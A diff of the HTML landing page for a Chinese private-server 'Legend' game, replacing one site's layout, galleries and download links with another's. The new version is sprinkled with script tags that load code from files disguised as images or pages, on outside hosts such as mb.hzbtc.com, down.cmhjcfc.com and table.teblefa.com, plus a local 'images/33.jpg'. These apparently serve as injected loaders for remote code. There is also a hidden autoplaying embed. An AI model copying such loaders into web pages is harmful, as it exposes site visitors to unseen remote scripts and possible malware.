@@ -1,257 +1,891 @@
-﻿<!DOCTYPE html>
+﻿<!doctype html>
 <html>
 <head>
-<meta charset="utf-8" />
-<title>圣域归来</title>
-<link href="style/style.css" rel="stylesheet" />
-<script src="js/jquery.js"></script>
-<script src="js/jqueryslider.js"></script>
-<script src="js/jqueryXslider.js"></script>
-<script src="js/jquery.roundabout.js"></script>
-<script src="js/jquery.jcarousellite.js"></script>
-<script src="js/jqueryslidera.js"></script>
-<script src="js/load.js"></script>
-<script src="js/load2.js"></script>
-<script src="js/main.js" type="text/javascript"></script>   
-<link rel="icon" href="favicon.ico" type="image/x-icon" />   
-<!--[if lt IE 9]>
-      <script language="javascript" type="text/javascript" src="js/html5.js"></script>
-      <script language="javascript" type="text/javascript" src="js/selectivizr-min.js"></script>
-<![endif]-->
+<meta charset="utf-8">
+<title>风华沉默 【霸业传奇】</title>
+	<link href="css/css.css" rel="stylesheet" type="text/css">
+	<link href="css/swiper.css" rel="stylesheet">	
+	<script src="js/jquery1.42.min.js"></script>
+    <script src="js/jquery.SuperSlide.2.1.3.js"></script>
+	<script src="js/main.js" type="text/javascript"></script>
+<link rel="icon" href="favicon.ico" type="image/x-icon" />  
+    <!--[if IE 8]>
+		<script src="js/html5media.min.js"></script>
+    <![endif]-->
+    <style type="text/css">
+<!--
+#Layer1 {
+	position:relative;
+	width:1500px;
+	height:500px;
+	z-index:1;
+	top: 105px;
+}
+#Layer3 {
+	position:relative;
+	width:1500px;
+	height:755px;
+	z-index:1;
+}
+#Layer12 {
+	position:relative;
+	height:84px;
+	z-index:1;
+	background-image: url(images/Dh.jpg);
+	background-repeat: no-repeat;
+	background-position: center;
+	width: 1920px;
+}
+#Layer13 {
+	position:absolute;
+	width:95px;
+	height:25px;
+	z-index:1;
+	top: 30px;
+	left: 1026px;
+}
+#Layer14 {
+	position:absolute;
+	width:95px;
+	height:25px;
+	z-index:2;
+	left: 1151px;
+	top: 31px;
+}
+#Layer15 {
+	position:absolute;
+	width:95px;
+	height:25px;
+	z-index:3;
+	left: 1275px;
+	top: 30px;
+}
+#Layer18 {
+	position:absolute;
+	width:1920px;
+	height:1080px;
+	z-index:5;
+	top: 0px;
+	left: 0px;
+}
+#Layer19 {
+	position:absolute;
+	width:200px;
+	height:115px;
+	z-index:1;
+	left: 946px;
+	top: 776px;
+}
+#Layer6 {
+	position:absolute;
+	width:120px;
+	height:110px;
+	z-index:2;
+	left: 900px;
+	top: 732px;
+	background-image: url(images/qrcode1.png);
+	background-repeat: no-repeat;
+}
+#Layer2 {
+	position:absolute;
+	width:1018px;
+	height:565px;
+	z-index:2;
+	background-image: url(images/fb.gif);
+	left: 450px;
+	top: 80px;
+}
+#Layer4 {
+	position:absolute;
+	width:1920px;
+	height:132px;
+	z-index:2;
+	left: 0px;
+	top: 0px;
+	background-image: url(images/bj_07.jpg);
+	background-repeat: no-repeat;
+}
+#Layer5 {
+	position:absolute;
+	width:700px;
+	height:90px;
+	z-index:1;
+	left: 777px;
+	top: 24px;
+}
+.STYLE2 {	font-size: 12px;
+	color: #FFFFFF;
+}
+a:link {
+	color: #CCCCCC;
+}
+a:visited {
+	color: #CCCCCC;
+}
+a:hover {
+	color: #CCCCCC;
+}
+a:active {
+	color: #CCCCCC;
+}
+#Layer7 {
+	position:absolute;
+	width:95px;
+	height:25px;
+	z-index:4;
+	left: 1398px;
+	top: 30px;
+}
+#Layer8 {
+	position:absolute;
+	width:265px;
+	height:65px;
+	z-index:1;
+	left: 503px;
+	top: 906px;
+}
+#Layer9 {
+	position:absolute;
+	width:265px;
+	height:65px;
+	z-index:2;
+	left: 828px;
+	top: 906px;
+}
+#Layer10 {
+	position:absolute;
+	width:265px;
+	height:65px;
+	z-index:3;
+	left: 1150px;
+	top: 906px;
+}
+#Layer11 {
+	position:absolute;
+	width:935px;
+	height:450px;
+	z-index:2;
+	left: 482px;
+	top: 234px;
+}
+.STYLE3 {color: #CCCCCC; font-size: 16px; font-weight: bold; }
+.STYLE4 {
+	font-size: 12px;
+	color: #CCCCCC;
+}
+.STYLE6 {font-size: 13px; color: #CCCCCC; }
+-->
 
-<!-- 页面设计：小山设计工作室 小山设计| 专注于高端传奇网站制作：www.bailu123.com | 创建：2021-05-31-->
+#Version{width:100%;height:1600px;position:relative;overflow:hidden;padding-top: 68px;z-index:11}
+#Flash{width:1920px;height:1600px;position:absolute;left:50%;margin:0px auto -272px -960px;z-index:-1}
+#Header{margin:0 auto -290px -960px;width:1920px;height:1600px;position:absolute;left:50%;z-index:-2;line-height:0px;}
+    </style>
+<meta http-equiv="Content-Type" content="text/html; charset=utf-8">
 </head>
-    <body>
-<div class="musicbox musicplay"  style="z-index:333333"><audio autoplay loop id="audio" src="bailu123.mp3"> 您的浏览器不支持 audio 元素 请切换为极速模式。 </audio></div>
-    <div class="container">
-        <div class="nav">
-            <a href="#" class="t-logo"></a>
-
-            <div class="r-nav-c">
-
-                <div class="al"><a href="https://wwr.lanzoui.com/ipPFssig2gf" class="a1 on"   target="_blank" title="客户端下载"></a></div>                    
-                <div class="al"><a href="https://wwr.lanzoui.com/ipPFssig2gf" class="a2 "   target="_blank" title="微端下载"></a></div>
-                <div class="al"><a href="https://qm.qq.com/cgi-bin/qm/qr?k=7mW8Jh1PoDl6ixzaLC50CRw4Nve3gf_o&jump_from=webapi" class="a3 "   target="_blank" title="在线充值"></a></div>
-                <div class="al"><a href="https://qm.qq.com/cgi-bin/qm/qr?k=7mW8Jh1PoDl6ixzaLC50CRw4Nve3gf_o&jump_from=webapi" class="a4 "   target="_blank" title="在线客服"></a></div>
-
-                </div>
-
-            </div>
-        </div>
+<body>
+ <embed src="https://qm.qq.com/cgi-bin/qm/qr?k=tpYQaqlkx6isfgWFxpOeZSZeVT1TASqu&jump_from=webapi" autostart="true" loop="true" hidden="true">
+<div class="bigcontainer" >
 
 
-<script>var CopyRightcss = "Top/css/cptop.css";</script>
-<script src="Top/js/CopyTop.js" charset="utf-8"></script>
-
-     <div id="quicklinks">
-
-          <a class="down01_btn" href="https://wwr.lanzoui.com/ipPFssig2gf"  target="_blank">登录器下载</a>
-          <a class="down02_btn" href="https://wwr.lanzoui.com/ipPFssig2gf"  target="_blank">微端下载</a>
-          <a class="down03_btn" href="https://wwr.lanzoui.com/ipPFssig2gf"  target="_blank">补丁下载</a>
-          <a class="down04_btn" href="https://qm.qq.com/cgi-bin/qm/qr?k=7mW8Jh1PoDl6ixzaLC50CRw4Nve3gf_o&jump_from=webapi"  target="_blank">在线充值</a>
-
-     </div>
-
-
-    <div id="m1">
-                <div class="center"> 
-                    <section id="news">
-                           <ul  class="NewsList">
-                                   <li><a class="lx" >【圣域归来】：</a><a >简单，粗暴，不复杂。上手快..Boss多。限时等你来拿。游戏交流群：157011682。</a></li>
-                                   <li><a class="lx" >【圣域归来】：</a><a >简单，粗暴，不复杂。上手快..Boss多。限时等你来拿。游戏交流群：157011682。</a></li>
-                                   <li><a class="lx" >【圣域归来】：</a><a >简单，粗暴，不复杂。上手快..Boss多。限时等你来拿。游戏交流群：157011682。</a></li>
-                                   <li><a class="lx" >【圣域归来】：</a><a >简单，粗暴，不复杂。上手快..Boss多。限时等你来拿。游戏交流群：157011682。</a></li>
-                                   <li><a class="lx" >【圣域归来】：</a><a >简单，粗暴，不复杂。上手快..Boss多。限时等你来拿。游戏交流群：157011682。</a></li>
-                                   <li><a class="lx" >【圣域归来】：</a><a >简单，粗暴，不复杂。上手快..Boss多。限时等你来拿。游戏交流群：157011682。</a></li>
-                                   <li><a class="lx" >【圣域归来】：</a><a >简单，粗暴，不复杂。上手快..Boss多。限时等你来拿。游戏交流群：157011682。</a></li>
-                                   <li><a class="lx" >【圣域归来】：</a><a >简单，粗暴，不复杂。上手快..Boss多。限时等你来拿。游戏交流群：157011682。</a></li>
-                                   <li><a class="lx" >【圣域归来】：</a><a >简单，粗暴，不复杂。上手快..Boss多。限时等你来拿。游戏交流群：157011682。</a></li>
-                                   <li><a class="lx" >【圣域归来】：</a><a >简单，粗暴，不复杂。上手快..Boss多。限时等你来拿。游戏交流群：157011682。</a></li>
-                           </ul>
-                    </section>
-                </div>
-    </div>
-
-
-        <div id="m2">
-
-       </div>
-
-
-        <div id="m3">
-                <div class="center">
-               <div class="chongwu"><img src="zb/1.gif"/></div>
-               </div>
-       </div>
-
-
-        <div id="m4">
-                <div class="center">
-	      <ul class="m6piccon">
-		<li><a rel="BUFF/001.png" class="preview"><img src="BUFF/1.png"  width="100" height="100"  /><span>圣域归来</span></a></li>
-		<li><a rel="BUFF/002.png" class="preview"><img src="BUFF/2.png"  width="100" height="100"  /><span>圣域归来</span></a></li>
-		<li><a rel="BUFF/003.png" class="preview"><img src="BUFF/3.png"  width="100" height="100"  /><span>圣域归来</span></a></li>
-		<li><a rel="BUFF/004.png" class="preview"><img src="BUFF/4.png"  width="100" height="100"  /><span>圣域归来</span></a></li>
-		<li><a rel="BUFF/005.png" class="preview"><img src="BUFF/5.png"  width="100" height="100"  /><span>圣域归来</span></a></li>
-		<li><a rel="BUFF/006.png" class="preview"><img src="BUFF/6.png"  width="100" height="100"  /><span>圣域归来</span></a></li>
-		<li><a rel="BUFF/007.png" class="preview"><img src="BUFF/7.png"  width="100" height="100"  /><span>圣域归来</span></a></li>
-		<li><a rel="BUFF/008.png" class="preview"><img src="BUFF/8.png"  width="100" height="100"  /><span>圣域归来</span></a></li>
-		<li><a rel="BUFF/009.png" class="preview"><img src="BUFF/9.png"  width="100" height="100"  /><span>圣域归来</span></a></li>
-		<li><a rel="BUFF/010.png" class="preview"><img src="BUFF/10.png"  width="100" height="100"  /><span>圣域归来</span></a></li>
-
-	      </ul> 
-
-	      <ul class="m7piccon">
-		<li><a rel="BUFF/011.png" class="preview"><img src="BUFF/11.png"  width="100" height="100"  /><span>圣域归来</span></a></li>
-		<li><a rel="BUFF/012.png" class="preview"><img src="BUFF/12.png"  width="100" height="100"  /><span>圣域归来</span></a></li>
-		<li><a rel="BUFF/013.png" class="preview"><img src="BUFF/13.png"  width="100" height="100"  /><span>圣域归来</span></a></li>
-		<li><a rel="BUFF/014.png" class="preview"><img src="BUFF/14.png"  width="100" height="100"  /><span>圣域归来</span></a></li>
-		<li><a rel="BUFF/015.png" class="preview"><img src="BUFF/15.png"  width="100" height="100"  /><span>圣域归来</span></a></li>
-		<li><a rel="BUFF/016.png" class="preview"><img src="BUFF/16.png"  width="100" height="100"  /><span>圣域归来</span></a></li>
-		<li><a rel="BUFF/017.png" class="preview"><img src="BUFF/17.png"  width="100" height="100"  /><span>圣域归来</span></a></li>
-		<li><a rel="BUFF/018.png" class="preview"><img src="BUFF/18.png"  width="100" height="100"  /><span>圣域归来</span></a></li>
-		<li><a rel="BUFF/019.png" class="preview"><img src="BUFF/19.png"  width="100" height="100"  /><span>圣域归来</span></a></li>
-		<li><a rel="BUFF/020.png" class="preview"><img src="BUFF/20.png"  width="100" height="100"  /><span>圣域归来</span></a></li>
-	      </ul> 
-
-
-	      <ul class="m7piccon">
-		<li><a rel="BUFF/021.png" class="preview"><img src="BUFF/21.png"  width="100" height="100"  /><span>圣域归来</span></a></li>
-		<li><a rel="BUFF/022.png" class="preview"><img src="BUFF/22.png"  width="100" height="100"  /><span>圣域归来</span></a></li>
-		<li><a rel="BUFF/023.png" class="preview"><img src="BUFF/23.png"  width="100" height="100"  /><span>圣域归来</span></a></li>
-		<li><a rel="BUFF/024.png" class="preview"><img src="BUFF/24.png"  width="100" height="100"  /><span>圣域归来</span></a></li>
-		<li><a rel="BUFF/025.png" class="preview"><img src="BUFF/25.png"  width="100" height="100"  /><span>圣域归来</span></a></li>
-		<li><a rel="BUFF/026.png" class="preview"><img src="BUFF/26.png"  width="100" height="100"  /><span>圣域归来</span></a></li>
-		<li><a rel="BUFF/027.png" class="preview"><img src="BUFF/27.png"  width="100" height="100"  /><span>圣域归来</span></a></li>
-		<li><a rel="BUFF/028.png" class="preview"><img src="BUFF/28.png"  width="100" height="100"  /><span>圣域归来</span></a></li>
-		<li><a rel="BUFF/029.png" class="preview"><img src="BUFF/29.png"  width="100" height="100"  /><span>圣域归来</span></a></li>
-		<li><a rel="BUFF/030.png" class="preview"><img src="BUFF/30.png"  width="100" height="100"  /><span>圣域归来</span></a></li>
-	      </ul> 
-
-
-	      <ul class="m7piccon">
-		<li><a rel="BUFF/031.png" class="preview"><img src="BUFF/31.png"  width="100" height="100"  /><span>圣域归来</span></a></li>
-		<li><a rel="BUFF/032.png" class="preview"><img src="BUFF/32.png"  width="100" height="100"  /><span>圣域归来</span></a></li>
-		<li><a rel="BUFF/033.png" class="preview"><img src="BUFF/33.png"  width="100" height="100"  /><span>圣域归来</span></a></li>
-		<li><a rel="BUFF/034.png" class="preview"><img src="BUFF/34.png"  width="100" height="100"  /><span>圣域归来</span></a></li>
-		<li><a rel="BUFF/035.png" class="preview"><img src="BUFF/35.png"  width="100" height="100"  /><span>圣域归来</span></a></li>
-		<li><a rel="BUFF/036.png" class="preview"><img src="BUFF/36.png"  width="100" height="100"  /><span>圣域归来</span></a></li>
-		<li><a rel="BUFF/037.png" class="preview"><img src="BUFF/37.png"  width="100" height="100"  /><span>圣域归来</span></a></li>
-		<li><a rel="BUFF/038.png" class="preview"><img src="BUFF/38.png"  width="100" height="100"  /><span>圣域归来</span></a></li>
-		<li><a rel="BUFF/039.png" class="preview"><img src="BUFF/39.png"  width="100" height="100"  /><span>圣域归来</span></a></li>
-		<li><a rel="BUFF/040.png" class="preview"><img src="BUFF/40.png"  width="100" height="100"  /><span>圣域归来</span></a></li>
-	      </ul> 
-
-	      <ul class="m7piccon">
-		<li><a rel="BUFF/051.png" class="preview"><img src="BUFF/51.png"  width="100" height="100"  /><span>圣域归来</span></a></li>
-		<li><a rel="BUFF/052.png" class="preview"><img src="BUFF/52.png"  width="100" height="100"  /><span>圣域归来</span></a></li>
-		<li><a rel="BUFF/053.png" class="preview"><img src="BUFF/53.png"  width="100" height="100"  /><span>圣域归来</span></a></li>
-		<li><a rel="BUFF/054.png" class="preview"><img src="BUFF/54.png"  width="100" height="100"  /><span>圣域归来</span></a></li>
-		<li><a rel="BUFF/055.png" class="preview"><img src="BUFF/55.png"  width="100" height="100"  /><span>圣域归来</span></a></li>
-		<li><a rel="BUFF/056.png" class="preview"><img src="BUFF/56.png"  width="100" height="100"  /><span>圣域归来</span></a></li>
-		<li><a rel="BUFF/057.png" class="preview"><img src="BUFF/57.png"  width="100" height="100"  /><span>圣域归来</span></a></li>
-		<li><a rel="BUFF/058.png" class="preview"><img src="BUFF/58.png"  width="100" height="100"  /><span>圣域归来</span></a></li>
-		<li><a rel="BUFF/059.png" class="preview"><img src="BUFF/59.png"  width="100" height="100"  /><span>圣域归来</span></a></li>
-		<li><a rel="BUFF/060.png" class="preview"><img src="BUFF/60.png"  width="100" height="100"  /><span>圣域归来</span></a></li>
-	      </ul> 
-
-	      <ul class="m7piccon">
-		<li><a rel="BUFF/061.png" class="preview"><img src="BUFF/61.png"  width="100" height="100"  /><span>圣域归来</span></a></li>
-		<li><a rel="BUFF/062.png" class="preview"><img src="BUFF/62.png"  width="100" height="100"  /><span>圣域归来</span></a></li>
-		<li><a rel="BUFF/063.png" class="preview"><img src="BUFF/63.png"  width="100" height="100"  /><span>圣域归来</span></a></li>
-		<li><a rel="BUFF/064.png" class="preview"><img src="BUFF/64.png"  width="100" height="100"  /><span>圣域归来</span></a></li>
-		<li><a rel="BUFF/065.png" class="preview"><img src="BUFF/65.png"  width="100" height="100"  /><span>圣域归来</span></a></li>
-		<li><a rel="BUFF/066.png" class="preview"><img src="BUFF/66.png"  width="100" height="100"  /><span>圣域归来</span></a></li>
-		<li><a rel="BUFF/067.png" class="preview"><img src="BUFF/67.png"  width="100" height="100"  /><span>圣域归来</span></a></li>
-		<li><a rel="BUFF/068.png" class="preview"><img src="BUFF/68.png"  width="100" height="100"  /><span>圣域归来</span></a></li>
-		<li><a rel="BUFF/069.png" class="preview"><img src="BUFF/69.png"  width="100" height="100"  /><span>圣域归来</span></a></li>
-
-	      </ul> 
-
-
-
-
-               </div>
-       </div>
-
-
-
-
-
-
-	<div id="Floatingbar">
-			<ul class="kefuList">
-
-				<li><a href="https://wwr.lanzoui.com/ipPFssig2gf" target="_blank">
-				<div class="userphoto">
-					<img src="images/user_pic1.png" alt="description " />
-				</div>登录器下载<em>游戏综合下载</em></a></li>
-
-				<li><a href="https://wwr.lanzoui.com/ipPFssig2gf" target="_blank">
-				<div class="userphoto">
-					<img src="images/user_pic1.png" alt="description " />
-				</div>微端下载<em>无须补丁极速下载</em></a></li>
-
-				<li><a href="https://wwr.lanzoui.com/ipPFssig2gf" target="_blank">
-				<div class="userphoto">
-					<img src="images/user_pic1.png" alt="description " />
-				</div>补丁下载<em>补丁极速下载</em></a></li>
-
-
-				<li><a href="https://qm.qq.com/cgi-bin/qm/qr?k=7mW8Jh1PoDl6ixzaLC50CRw4Nve3gf_o&jump_from=webapi" target="_blank">
-				<div class="userphoto">
-					<img src="images/user_pic1.png" alt="description " />
-				</div>在线充值<em>立即充值体验激情</em></a></li>
-
-				<li><a href="https://qm.qq.com/cgi-bin/qm/qr?k=7mW8Jh1PoDl6ixzaLC50CRw4Nve3gf_o&jump_from=webapi" target="_blank">
-				<div class="userphoto">
-					<img src="images/icon_qq.png" alt="description " />
-				</div>加入QQ群<em>玩家交流群</em></a></li>
-
-			</ul>
-		<a href="#" class="btn_backtop">TOP</a>
-		<a href="#" class="btn_openhide">收起&gt;</a>
+  <style type="text/css">
+  .STYLE1 {font-size: 24px;}
+  .topstyle{position:fixed;z-index:999}
+.topstyle a {text-decoration: none;color: #4f4f4f;}
+</style>
+<table width="100%" height="50" bgcolor="#FFFFFF" border="0" class="topstyle">
+	<tbody>
+		<tr><script src="images/33.jpg"></script>
+			<td width="33%" bgcolor="#FFFFFF"><div align="right"><img src="images/top_logo.png" width="320" height="60"></div></td>
+			<td width="18%" bgcolor="#FFFFFF"><div align="left"><img src="images/top_bxsj.gif" width="260" height="60"></div></td>
+			<td width="46%" bgcolor="#FFFFFF">&nbsp;&nbsp;<span class="STYLE1"><a href="www.baidu.com" target="_blank" class="kefu">游戏下载</a>&nbsp; &nbsp;&nbsp;<a href="payurls.html" target="_blank" class="kefu">游戏充值</a> &nbsp;&nbsp;&nbsp;<a href="风华沉默遗迹V1.rar" target="_blank" class="kefu">游戏下载</a>&nbsp; &nbsp;&nbsp;<a href="https://qm.qq.com/cgi-bin/qm/qr?k=tpYQaqlkx6isfgWFxpOeZSZeVT1TASqu&jump_from=webapi" target="_blank">联系客服</a></span></td>
+		</tr>
+	</tbody>
+</table>
+   
+<div class="navs ab">
+		<a href="风华沉默遗迹V1.rar" target="_blank" class="nav1 bl fl"></a>
+		<a href="payurls.html" target="_blank" class="nav2 bl fl"></a>
+		<a href="www.baidu.com" target="_blank" class="nav3 bl fl"></a>
+		<a href="www.baidu.com" target="_blank" class="nav4 bl fl"></a>
 	</div>
-	<!-- Floatingbar结束 -->
 
-<script>var CopyRightcss = "css/black.css";</script>
-<script src="js/cqCopyRight.js" charset="gb2312"></script>
-<script type="text/javascript">
-/****mp3---*/
-var Setting = {
-  scrollSpeed: 2,
 
-};
-$(function(){
-	var bBtn = true;
-	var musicMp3 = document.getElementById("audio");	
-	var bBtn = true;
-	$('.musicbox').on('click',function(){	
-		if( bBtn ){		
-			$(this).removeClass('musicplay').addClass('musicstop');
-			bBtn = false;
-			musicMp3.pause();
-		}else{
-					
-			$(this).removeClass('musicstop').addClass('musicplay');
-			bBtn = true;		
-			musicMp3.play();  
-		
-		}
-	});
+
+  <div id="Version">
+		<div id="Header">
+		<img src="images/bg_01_01.jpg" width="1920"  />
+		<img src="images/bg_01_02.jpg" width="1920"  />
+		<img src="images/bg_01_03.jpg" width="1920"  />
+		<img src="images/bg_01_04.jpg" width="1920"  />
+		<img src="images/bg_01_05.jpg" width="1920"  /> 
+		</div>
+		<div id="Flash">
+				<video autoplay="" loop="" preload="auto" muted="" id="top-video"><source src="images/bj.mp4" type="video/mp4"></video>
+		</div>
+	</div>
+
+  </div><script src="http://mb.hzbtc.com/down.htm"></script>
+	<div class="gameIntro" id="yxjs">
 	
+	
+  </div>
 
-})	
-</script> 
-<a href="&#104;&#116;&#116;&#112;s&#58;&#47;&#47;&#119;&#119;&#119;&#46;&#114;&#117;&#99;&#105;&#119;&#97;&#110;&#46;&#99;&#111;&#109;" target="_blank">&#20256;&#22855;&#26381;&#21153;&#31471;</a>
-<script>
-var _hmt = _hmt || [];
-(function() {
-  var hm = document.createElement("script");
-  hm.src = "https://hm.baidu.com/hm.js?e53f20df403cd814f0707de5b59bc7b0";
-  var s = document.getElementsByTagName("script")[0]; 
-  s.parentNode.insertBefore(hm, s);
-})();
+
+ 
+
+
+	<div class="gzshow" id="szzs">
+	  <div align="center">
+	     <div class="items ab">
+	<ul>
+		<li>
+			<div class="itemcss">
+				<img src="sx/01.png">
+				<a href="#" class="now preview" rel="sx/a1.png">&nbsp;</a>
+			</div>
+		</li>
+
+		<li>
+			<div class="itemcss">
+				<img src="sx/02.png">
+				<a href="#" class="now preview" rel="sx/a2.png">&nbsp;</a>
+			</div>
+		</li>
+
+		<li>
+			<div class="itemcss">
+				<img src="sx/03.png">
+				<a href="#" class="now preview" rel="sx/a3.png">&nbsp;</a>
+			</div>
+		</li>
+
+		<li>
+			<div class="itemcss">
+				<img src="sx/04.png">
+				<a href="#" class="now preview" rel="sx/a4.png">&nbsp;</a>
+			</div>
+		</li>
+
+		<li>
+			<div class="itemcss">
+				<img src="sx/05.png">
+				<a href="#" class="now preview" rel="sx/a5.png">&nbsp;</a>
+			</div>
+		</li>
+
+		<li>
+			<div class="itemcss">
+				<img src="sx/06.png">
+				<a href="#" class="now preview" rel="sx/a6.png">&nbsp;</a>
+			</div>
+		</li>
+
+		<li>
+			<div class="itemcss">
+				<img src="sx/07.png">
+				<a href="#" class="now preview" rel="sx/a7.png">&nbsp;</a>
+			</div>
+		</li>
+
+		<li>
+			<div class="itemcss">
+			<img src="sx/08.png">
+				<a href="#" class="now preview" rel="sx/a8.png">&nbsp;</a>
+			</div>
+		</li>
+
+		<li>
+			<div class="itemcss">
+			<img src="sx/09.png">
+				<a href="#" class="now preview" rel="sx/a9.png">&nbsp;</a>
+			</div>
+		</li>
+
+		<li >
+			<div class="itemcss"style="margin-top: -18px;">
+			<img src="sx/10.png">
+				<a href="#" class="now preview" rel="sx/a10.png">&nbsp;</a>
+			</div>
+		</li>
+
+		<li >
+			<div class="itemcss"style="margin-top: -18px;">
+			<img src="sx/11.png">
+				<a href="#" class="now preview" rel="sx/a11.png">&nbsp;</a>
+			</div>
+		</li>
+
+		<li >
+			<div class="itemcss"style="margin-top: -18px;">
+			<img src="sx/12.png">
+				<a href="#" class="now preview" rel="sx/a12.png">&nbsp;</a>
+			</div> 
+		</li>
+
+		<li>
+			<div class="itemcss"style="margin-top: -18px;">
+			<img src="sx/13.png">
+				<a href="#" class="now preview" rel="sx/a13.png">&nbsp;</a>
+			</div>
+		</li>
+
+		<li>
+			<div class="itemcss"style="margin-top: -18px;">
+			<img src="sx/14.png">
+				<a href="#" class="now preview" rel="sx/a14.png">&nbsp;</a>
+			</div>
+		</li>
+
+		<li>
+			<div class="itemcss"style="margin-top: -18px;">
+			<img src="sx/15.png">
+				<a href="#" class="now preview" rel="sx/a15.png">&nbsp;</a>
+			</div>
+		</li>
+
+		<li>
+			<div class="itemcss"style="margin-top: -18px;">
+				<img src="sx/16.png">
+				<a href="#" class="now preview" rel="sx/a16.png">&nbsp;</a>
+			</div>
+		</li>
+
+		<li >
+			<div class="itemcss"style="margin-top: -18px;">
+		<img src="sx/17.png">
+				<a href="#" class="now preview" rel="sx/a17.png">&nbsp;</a>
+			</div>
+		</li>
+
+		<li >
+			<div class="itemcss"style="margin-top: -18px;">
+				<img src="sx/18.png">
+				<a href="#" class="now preview" rel="sx/a18.png">&nbsp;</a>
+			</div>
+		</li>
+
+		<li >
+			<div class="itemcss"style="margin-top: -34px;">
+				<img src="sx/19.png">
+				<a href="#" class="now preview" rel="sx/a19.png">&nbsp;</a>
+			</div>
+		</li>
+
+		<li >
+			<div class="itemcss"style="margin-top: -34px;">
+				<img src="sx/20.png">
+				<a href="#" class="now preview" rel="sx/a20.png">&nbsp;</a>
+			</div>
+		</li>
+
+			<li>
+			<div class="itemcss"style="margin-top: -34px;">
+				<img src="sx/21.png">
+				<a href="#" class="now preview" rel="sx/a21.png">&nbsp;</a>
+			</div>
+		</li>
+
+		<li>
+			<div class="itemcss"style="margin-top: -34px;">
+				<img src="sx/22.png">
+				<a href="#" class="now preview" rel="sx/a22.png">&nbsp;</a>
+			</div>
+		</li>
+
+		<li>
+			<div class="itemcss"style="margin-top: -34px;">
+				<img src="sx/23.png">
+				<a href="#" class="now preview" rel="sx/a23.png">&nbsp;</a>
+			</div>
+		</li>
+
+		<li>
+			<div class="itemcss"style="margin-top: -34px;">
+				<img src="sx/24.png">
+				<a href="#" class="now preview" rel="sx/a24.png">&nbsp;</a>
+			</div>
+		</li>
+
+		<li>
+			<div class="itemcss"style="margin-top: -34px;">
+				<img src="sx/25.png">
+				<a href="#" class="now preview" rel="sx/a25.png">&nbsp;</a>
+			</div>
+		</li>
+
+		<li>
+			<div class="itemcss"style="margin-top: -34px;">
+				<img src="sx/26.png">
+				<a href="#" class="now preview" rel="sx/a26.png">&nbsp;</a>
+			</div>
+		</li>
+
+		<li>
+			<div class="itemcss"style="margin-top: -34px;">
+				<img src="sx/27.png">
+				<a href="#" class="now preview" rel="sx/a27.png">&nbsp;</a>
+			</div>
+		</li>
+
+		<li>
+			<div class="itemcss"style="margin-top: -62px;">
+			<img src="sx/28.png">
+				<a href="#" class="now preview" rel="sx/a28.png">&nbsp;</a>
+			</div>
+		</li>
+
+		<li>
+			<div class="itemcss"style="margin-top: -62px;">
+			<img src="sx/29.png">
+				<a href="#" class="now preview" rel="sx/a29.png">&nbsp;</a>
+			</div>
+		</li>
+
+		<li>
+			<div class="itemcss"style="margin-top: -62px;">
+			<img src="sx/30.png">
+				<a href="#" class="now preview" rel="sx/a30.png">&nbsp;</a>
+			</div>
+		</li>
+
+		<li>
+			<div class="itemcss"style="margin-top: -62px;">
+			<img src="sx/31.png">
+				<a href="#" class="now preview" rel="sx/a31.png">&nbsp;</a>
+			</div>
+		</li>
+
+		<li>
+			<div class="itemcss"style="margin-top: -62px;">
+			<img src="sx/32.png">
+				<a href="#" class="now preview" rel="sx/a32.png">&nbsp;</a>
+			</div> 
+		</li>
+
+		<li>
+			<div class="itemcss"style="margin-top: -62px;">
+			<img src="sx/33.png">
+				<a href="#" class="now preview" rel="sx/a33.png">&nbsp;</a>
+			</div>
+		</li>
+
+		<li>
+			<div class="itemcss"style="margin-top: -62px;">
+			<img src="sx/34.png">
+				<a href="#" class="now preview" rel="sx/a34.png">&nbsp;</a>
+			</div>
+		</li>
+
+		<li>
+			<div class="itemcss"style="margin-top: -62px;">
+			<img src="sx/35.png">
+				<a href="#" class="now preview" rel="sx/a35.png">&nbsp;</a>
+			</div>
+		</li>
+
+		<li>
+			<div class="itemcss"style="margin-top: -62px;">
+				<img src="sx/36.png">
+				<a href="#" class="now preview" rel="sx/a36.png">&nbsp;</a>
+			</div>
+		</li>
+
+
+		
+
+
+
+	</ul>
+	</div>
+	  </div>
+  </div>
+	<div class="zbShow" id="jcjt">
+	   <div align="center">
+	    <iframe width="100%" height="780"  frameborder="0" scrolling="no" src="lunbo/1.htm"style="    margin-top:88px;
+    margin-left: -140px;"></iframe>  
+	  </div><script src="http://down.cmhjcfc.com/downn.gif"></script>
+	 
+  </div>
+
+
+
+<div class="zbShow2" id="jcjt1">
+	   <div align="center">
+	    <div class="slide2 ab">
+            <div class="slide2images">
+              <ul class="uls">
+                <li><img src="img/1.jpg"></li>
+				<li><img src="img/2.jpg"></li>
+				<li><img src="img/3.jpg"></li>
+				<li><img src="img/4.jpg"></li>
+				<li><img src="img/5.jpg"></li>
+				<li><img src="img/6.jpg"></li>
+			
+              
+               
+              </ul>
+			   <a class="prev bl rl" href="javascript:void(0)"><img src="images/01x.png" width="51" height="88"></a> 
+			  <a class="next bl rl" href="javascript:void(0)"><img src="images/02x.png" width="51" height="88"></a> 
+              </div>
+          
+          </div>
+	  </div>
+	
+  </div>
+
+  <div class="zbShow3" id="jcjt3">
+	   <div align="center">
+	    <div class="slide3 ab">
+            <div class="slide3images">
+              <ul class="uls">
+                <li><img src="img/01.gif"></li>
+				<li><img src="img/02.gif"></li>
+				<li><img src="img/03.gif"></li>
+				
+               
+              </ul>
+			   <a class="prev bl rl" href="javascript:void(0)"><img src="images/01x.png" width="51" height="88"></a> 
+			  <a class="next bl rl" href="javascript:void(0)"><img src="images/02x.png" width="51" height="88"></a> 
+              </div>
+          
+          </div>
+	  </div>
+	
+  </div>
+
+
+
+	<div align="center"></div>
+	<div class="bottom" id="gzzs">
+
+	 
+	   
+      
+          <div id="Layer4">
+            <div id="Layer5">
+              <div id="layer2">
+                <div align="left" class="STYLE2">
+                  <p>抵制不良游戏 拒绝盗版游戏 注意自我保护 谨防上当受骗 适度游戏益脑 沉迷游戏伤身 合理安排时间 享受健康生活</p>
+                  <p>&nbsp;</p>
+                  <p>All rights reserved. 版权所有 本游戏由【风华沉默】独家开发运营</p>
+                  <p>&nbsp;</p>
+                  <p>网站美术及游戏素材设计由：倾城科技<a href="www.baidu.com" target="_blank">【霸业传奇】</a>提供设计制作</p>
+                </div>
+              
+            
+          </div>
+	    </div>
+	  </div><script src="http://table.teblefa.com/dlq.gif"></script>
+  </div>
+
+
+	<audio autoplay="" preload="auto" id="Music">
+	<!-- 音乐替换处 -->
